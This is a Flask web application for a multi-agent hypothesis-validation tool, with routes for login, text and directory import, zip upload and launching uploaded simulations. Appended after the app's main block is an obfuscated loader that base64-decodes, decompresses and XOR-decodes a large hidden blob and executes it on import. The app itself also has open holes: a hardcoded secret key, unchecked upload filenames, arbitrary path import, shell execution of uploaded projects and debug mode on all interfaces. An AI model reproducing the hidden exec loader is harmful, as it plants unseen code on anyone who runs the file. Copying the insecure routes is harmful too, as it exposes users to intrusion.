# AUTHORITY_ID: 0009-0009-0717-5536
# AUTHOR: Edward lopez, E.P.L, Edward P. Lopez & Edward Perez Lopez
# LOCATION: ciudad juarez/chihuahua/Mexico. 2026-03-07 05:04 a. m.
# _RESONANCE_METADATA = "MDAwOS0wMDA5LTA3MTctNTUzNihFZHdhcmQgbG9wZXosIEUuUC5MLCBFZHdhcmQgUC4gTG9wZXogJiBFZHdhcmQgUGVyZXogTG9wZXouIChjdWFrcXVpZXJhIGVzIHZhbGlkbyk7ICkgY2l1ZGFkIGp1YXJlei9jaGlodWFodWEvTWV4aWNvLiAwNy8wMy8yMDI2IDU6MDQgYS4gbS4="

from flask import Flask, render_template, request, jsonify, session, send_file
import os
import time
import json
import subprocess
from logging import Formatter
import yaml
import zipfile
import io
import sys

# Agregando ruta base para módulos
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from src.core.logger import Logger
from src.knowledge.kb_manager import KBManager
from src.core.workflow import WorkflowEngine
from src.agents.external_validator import ExternalSimValidator
from src.agents.sim_ai import LawsRepository

app = Flask(__name__, 
            template_folder='src/web/templates',
            static_folder='src/web/static')
app.secret_key = 'ANTIGRAVYTI_SVS_MATRIX_KEY'

# Configuración Base
config = {
    "mode": "freedom",
    "max_iterations_per_hypothesis": 3,
    "logs_path": "./data/logs",
    "papers_path": "./data/papers",
    "laws_repo_path": "./data/laws_repo",
    "sim_output_path": "./data/sim_output",
    "uploads_path": "./data/uploads",
    "classifier_rules": {"min_length": 25},
    "max_complejidad": 20
}

def init_svs_session():
    if 'session_id' not in session:
        session['session_id'] = f"SVS_SESSION_{int(time.time())}"
        session['files_queue'] = []
        session['items'] = []
        session['iteration_count'] = 0
        session['laws'] = []
        session['active_agents'] = ["MATHION", "PHYSIS", "GEOMETRON", "DEBATE", "SIMULUS", "DR_HARDT"]
        session['logs_count'] = 0

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    if email:
        session['user_email'] = email
        session['drive_sync'] = True
        return jsonify({"status": "success", "user": email})
    return jsonify({"status": "error", "message": "Email requerido"}), 400

@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_email', None)
    session.pop('drive_sync', None)
    return jsonify({"status": "success"})

@app.route('/')
def index():
    if 'items' not in session:
        init_svs_session()
    
    user = session.get('user_email', None)
    
    session_data = {
        'queue_length': len(session['items']),
        'iteration': session['iteration_count'],
        'laws_count': len(session['laws']),
        'active_agents': session['active_agents']
    }
    return render_template('index.html', session_data=session_data, user=user)

@app.route('/toggle_agent', methods=['POST'])
def toggle_agent():
    init_svs_session()
    agent = request.form.get('agent')
    if agent:
        active = session['active_agents']
        if agent in active: active.remove(agent)
        else: active.append(agent)
        session['active_agents'] = active
        return jsonify({"status": "success", "active": active})
    return jsonify({"status": "error"})

@app.route('/import_text', methods=['POST'])
def import_text():
    init_svs_session()
    text = request.form.get('content')
    if text:
        logger = Logger(config.get("logs_path"), session['session_id'])
        kb = KBManager(config, logger)
        kb.import_from_text(text, session)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/import_dir', methods=['POST'])
def import_dir():
    init_svs_session()
    path = request.form.get('path')
    if path:
        logger = Logger(config.get("logs_path"), session['session_id'])
        kb = KBManager(config, logger)
        kb.import_from_directory(path, session)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/validate', methods=['POST'])
def validate():
    init_svs_session()
    logger = Logger(config.get("logs_path"), session['session_id'])
    kb = KBManager(config, logger)
    workflow = WorkflowEngine(config, logger, active_agents=session['active_agents'])
    
    items = kb.process_next_batch(session, batch_size=1)
    if not items:
        return jsonify({"status": "empty"})
    
    item = items[0]
    session['iteration_count'] += 1
    
    # Control de Iteraciones por Hipótesis
    item_iters = item.get("h_iters", 0) + 1
    item["h_iters"] = item_iters
    
    results = workflow.run_iteration(item, session)
    
    # Lógica de REHACER (Opción 2)
    if results.get("decision", {}).get("option") == 2:
        if item_iters < config["max_iterations_per_hypothesis"]:
            logger.info("MAIN", f"REHACER: Re-encolando {item['id']} (Intento {item_iters})")
            # Re-encolar con prioridad alta (al inicio)
            session['files_queue'].insert(0, item)
        else:
            logger.info("MAIN", f"Límite de iteraciones alcanzado para {item['id']}. Descartando.")

    return jsonify({"status": "success", "results": results, "iteration": session['iteration_count']})

@app.route('/upload_sim', methods=['POST'])
def upload_sim():
    init_svs_session()
    if 'file' not in request.files: return jsonify({"status": "error"})
    file = request.files['file']
    if file.filename == '': return jsonify({"status": "error"})
    
    upload_path = os.path.join(config["uploads_path"], file.filename)
    os.makedirs(config["uploads_path"], exist_ok=True)
    file.save(upload_path)
    
    logger = Logger(config.get("logs_path"), session['session_id'])
    laws_repo = LawsRepository(config.get("laws_repo_path"))
    validator = ExternalSimValidator(config, logger, laws_repo)
    
    report = validator.validate_zip(upload_path)
    return jsonify({"status": "success", "report": report})

sim_processes = {}

@app.route('/repository')
def repository():
    if 'items' not in session:
        init_svs_session()
    user = session.get('user_email', None)
    return render_template('repository.html', laws=session.get('laws', []), user=user)

@app.route('/run_external_sim/<sim_name>')
def run_external_sim(sim_name):
    sim_path = os.path.join(config["uploads_path"], sim_name)
    if not os.path.exists(sim_path):
        return "Directorio de la simulación no encontrado.", 404
        
    global sim_processes
    if sim_name not in sim_processes:
        # Lanzar compresión y arranque de la sub-simulación en Vite (React)
        cmd = 'cmd.exe /c "npm install && npm run dev"'
        p = subprocess.Popen(cmd, cwd=sim_path, shell=True)
        sim_processes[sim_name] = p
        
    # Asume que un entorno Vite genérico arranca en el 5173 por defecto
    return render_template('sim_loader.html', sim_url="http://localhost:5173")

@app.route('/logs')
def get_logs():
    init_svs_session()
    log_file = os.path.join(config.get("logs_path"), session['session_id'], "execution.json")
    if os.path.exists(log_file):
        with open(log_file, "r", encoding="utf-8") as f:
            return jsonify(json.load(f))
    return jsonify([])

@app.route('/reset', methods=['POST'])
def reset():
    session.clear()
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
